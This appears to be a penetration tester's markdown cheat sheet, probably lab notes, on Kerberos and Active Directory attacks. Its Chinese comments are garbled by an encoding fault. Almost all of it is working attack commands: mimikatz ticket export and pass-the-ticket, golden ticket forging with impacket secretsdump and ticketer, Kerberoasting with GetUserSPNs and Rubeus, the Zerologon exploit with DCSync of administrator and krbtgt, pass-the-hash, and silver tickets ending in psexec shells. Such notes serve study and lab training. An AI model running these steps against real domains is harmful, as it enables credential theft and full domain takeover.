Kerberos
===
ğŸ”™ [MENU README](./AD.md#penetration)


![](./kerbors.png)

# Export Kerberos Tickets
Environment
```bash
# 2019 DC 

klist  
# TGT
# 1. ç¬¬ä¸€å¼µä¸€å®šæ˜¯TGT
# 2. Server : krbtgt (ç”±krbtgté€™å€‹å¸³è™Ÿç°½å‡ºä¾†çš„)

# TGST
# 1. Host  : TGST
```
mimikatz
```bash
# https://github.com/gentilkiwi/mimikatz/releases
mimikatz

privilege::debug

sekurlsa::tickets /export
```
```
@ä¹‹å‰çš„æ˜¯å¸³è™Ÿ
krbtgtçš„æ˜¯GoldenTicket
```

# Pass The Ticket
```
Windows + R : \\ADWin\c$
Copy mimikatz x64 ç¥¨åˆ¸éå»

# Win Ad
Change Local Administrator Password
ä¸¦é‡æ–°ç™»å…¥Local Administrator

dir \\server2019.lpt.com\admin$ #é©—è­‰ä¸æœƒé€šé
cd åˆ°å‰›å‰›è¤‡è£½çš„mimikatz x64è³‡æ–™å¤¾
```
```bash
mimikatz #é€²å…¥mimikatz

# æ‰¾åˆ°Administrator@krbtgté‚£å¼µç¥¨åŒ¯å…¥
kerberos::ptt "*.kirbi"

# æŸ¥çœ‹åŒ¯å…¥çš„ç¥¨åˆ¸
kerberos::list
misc::cmd
klist

# æ¸¬è©¦å·²ç¶“å¯ä»¥touchåˆ°AD
dir \\server2019.lpt.com\admin$

# æ¸…é™¤åŒ¯å…¥çš„ç¥¨æ“š
kerberos::purge
```

# Golden Ticket Attack (TGT)
> æ‹¿åˆ°DCçš„krbtgtå¸³è™Ÿå¾Œï¼Œæƒ³å¹¹å˜›å°±å¹¹å˜›

Hashdump
```bash
# parrot
impacket-secretsdump 'administrator:Pa$$w0rd'@192.168.177.19

# å¯ä»¥æ‹¿åˆ°SAMã€krbtgt account
```
Domain SID
```bash
# parrot
python3 /opt/impacket/examples/lookupsid.py 'administrator:Pa$$w0rd'@192.168.177.19 0

# å–å¾—Domain SID
```
Gen Golden Ticket
```bash
python3 /opt/impacket/examples/ticketer.py -nthash <ntlm_hash> -domain-sid <sid> -domain lpt.com evil

# nthash : krbtgtçš„å¾Œé¢é‚£æ®µ
# evil ç‚ºå¸³è™Ÿåç¨±
# èˆŠçš„Golden Ticketå¯ä»¥æŠŠç¥¨åˆ¸ç™¼çµ¦ä¸€å€‹ä¸å­˜åœ¨çš„å¸³è™Ÿ
# å¾Œä¾†ä¸ŠPatchå¾Œå°±ä¸è¡Œé€™æ¨£æäº†
```
æ›è¼‰ç¥¨åˆ¸
```bash
# Linuxç¥¨åˆ¸æ›åœ¨ç’°å¢ƒè®Šæ•¸KRB5CCNAMEè£¡é¢
export KRB5CCNAME=~/evil.ccache
```
è™•ç†åç¨±è§£æçš„å•é¡Œ
```bash
cat /etc/hosts
echo 192.168.177.19 server2019.lpt.com | sudo tee -a /etc/hosts
```
Golden Ticket
```bash
psexec.py lpt.com/evil@server2019.lpt.com -k -no-pass -dc-ip 192.168.177.19
```

# Kerberoasting
ç”¨ä¾†æ”»æ“ŠKerberoasé‹ä½œçš„æ‰‹æ³•
```
ä»€éº¼æ™‚å€™æ‰æœƒç”¨åˆ°Kerberoasé©—è­‰æ–¹æ³•?
1. ä½ çš„æœå‹™æœ¬ä¾†å°±æŒ‡ä»¤Kerberoasé©—è­‰
2. ä½ çš„æœå‹™è¨»å†Šåœ¨ADä¹‹ä¸­

æ‰€ä»¥ç•¶ä½ çš„æœå‹™æ²’æœ‰æŒ‡å®šKerberoasä¹Ÿæ²’æœ‰è¨»å†Šåœ¨ADä¹‹ä¸­ï¼Œå°±å¾—èµ°NTLM
```
Kerberoasting
```
1. Attckeré€šéLDAPå…ˆå»æŸ¥è©¢ADä¸­æœ‰è¨»å†Šå“ªäº›æœå‹™
2. å»åšæœå‹™çš„å­˜å–ï¼ŒæŠŠKerberoasæµç¨‹runéä¸€é
3. Attackeræœƒæ‹¿åˆ°TGST
4. Kerberoastingåœ¨æ–¼å»ç ´è§£TGSTçš„å¸³è™Ÿå¯†ç¢¼
    Service Account
    Service Password
5. ç ´è§£å®Œå¾Œ
    å¯ä»¥æ“ä½œæœå‹™å¸³è™Ÿ(æœå‹™å¸³è™Ÿé€šå¸¸æ˜¯ç‰¹æ¬Šå¸³è™Ÿ)
    æˆ–è€…å»ç©Sliver Ticket
```
Build Enviroment
```bash
# 2019DC
# Register service in AD
setspn -s $ServiceName/lpt.com $UserName
setspn -s http/lpt.com user-one  # å¿…é ˆæ˜¯DCå…§æœ¬ä¾†å°±å­˜åœ¨çš„å¸³è™Ÿ
```
Kerberoasting in Linux
```bash
# Parrot
echo 192.168.177.19 server2019.lpt.com | sudo tee -a /etc/hosts
# SPN scan : LDAPæœå‹™æŸ¥è©¢
GetUserSPNs.py 'lpt.com/cpent:Pa$$w0rd' -dc-ip 192.168.177.19
# Request
GetUserSPNs.py 'lpt.com/cpent:Pa$$w0rd' -dc-ip 192.168.177.19 -request -outputfile kerberoast.txt
# ç ´è§£
john kerberoast.txt
```
Kerberoasting in Windows
```bash
# AD Win ç”¨ä¸€èˆ¬æˆ–æœ¬åœ°ä½¿ç”¨è€…
lpt\cpent


# Rubeus
# å°ˆæ¡ˆä¸­æ²’æœ‰åŸ·è¡Œæª”ï¼Œä½†ä½ å¯å»æœå°‹rubeus precompiled
# https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe


# SPN scan : LDAPæœå‹™æŸ¥è©¢
# Domain
Rubeus.exe kerberoast /domain:lpt.com
# Local 
Rubeus kerberoast /domain:lpt.com /creduser:lpt.com\cpent /credpassword:Pa$$w0rd


```

# Zerologon
```
å·¥ç¨‹å¸«åœ¨å¯«åŠ å¯†ç¨‹å¼æ™‚å°‡é‡‘é‘°å…¨éƒ¨è¨­å®šç‚º0æ‰€ä»¥å«åšZerologon
æ‰€ä»¥å¯ä»¥åˆ©ç”¨é€™å€‹æ¼æ´åœ¨æ²’æœ‰å¯†ç¢¼çš„æƒ…æ³ä¸‹ç™»å…¥DCæ‹¿åˆ°æœ€é«˜æ¬Šé™
Zerlogonå®Œå¾Œæœƒç™¼å‹•ä¸€å€‹æ”»æ“Š:DCSyncï¼Œæ˜¯ADçš„ä¸€å€‹æŒ‡ä»¤
DCSyncæ˜¯çµ¦ç³»çµ±ç”¨çš„ï¼Œç”¨æ–¼DCèˆ‡DCä¹‹é–“çš„application

è‹¥æ‹¿åˆ°krbtgt => PtT
è‹¥æ‹¿åˆ°Admin  => PtH

ZeroLogonæœƒæŠŠComputer Accountä¸Šçš„å¯†ç¢¼çµ¦Resetæ‰
å¾ˆå®¹æ˜“è®“ADä¸ç©©ï¼Œå¯ä»¥ç”¨postzerologonæ­¢è¡€ï¼Œä½†æœªå¿…æœ‰ç”¨
```
Zerologon
```bash
# AD Win
# Local Adminå¯ä»¥æ”¹ä¸€ä¸‹å¯†ç¢¼æ•ˆæœæ¯”è¼ƒå¥½
# mimikatzéœ€è¦ç”¨æ–°ç‰ˆçš„

mimikatz

# Zerologon
lsadump::Zerologon /target:192.168.177.19 /account:server2019$ /null /ntlm /exploit


# dcsync
# Sync Administrator
lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:administrator
# Sync krbtgt
lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:krbtgt

# å¹«DCæ­¢è¡€
lsadump::postzerologon /target:192.168.177.19 /account:server2019$
```
Pass The Hash
```bash
# mimikatz
privilege::debug
sekurlsa::pth /user:Administrator /domain:lpt.com /ntlm:<HASH>
```
Pass The Ticket
```bash
kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ptt

kerberos::list

misc::cmd
klist
klist add_bind lpt.com server2019.lpt.com

> OR 
kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ticket:evil.tck
```


---

# Sliver Ticket Attack (TGST) 
```
ä½¿ç”¨æœå‹™å¸³æˆ¶æˆ–æ©Ÿå™¨å¸³æˆ¶å»ºç«‹ç™½éŠ€ç¥¨
æ“šä»¥å­˜å–ç‰¹å®šçš„æœå‹™ï¼Œå¾è€Œæ“´å¤§æˆæœ
```
On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache 

python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
On Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```